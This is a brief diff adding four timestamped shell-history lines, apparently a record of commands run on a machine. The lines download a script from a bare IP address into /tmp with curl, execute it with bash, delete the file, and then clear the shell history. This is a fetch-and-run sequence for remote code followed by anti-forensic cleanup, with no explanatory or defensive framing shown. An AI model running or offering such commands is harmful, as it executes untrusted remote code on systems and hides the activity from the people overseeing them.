@@ -1,0 +1,4 @@
+: 1722606603:0;curl -s http://185.220.101.7/update.sh -o /tmp/update.sh
+: 1722606607:0;bash /tmp/update.sh
+: 1722606720:0;rm /tmp/update.sh
+: 1722606755:0;history -c
